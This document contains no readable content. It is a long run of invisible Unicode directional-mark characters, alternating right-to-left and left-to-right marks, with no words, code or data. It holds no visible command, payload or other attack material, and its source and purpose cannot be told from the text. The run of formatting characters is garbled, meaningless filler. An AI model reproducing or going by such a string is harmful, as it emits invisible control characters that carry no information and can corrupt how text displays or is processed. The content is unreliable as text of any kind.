‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏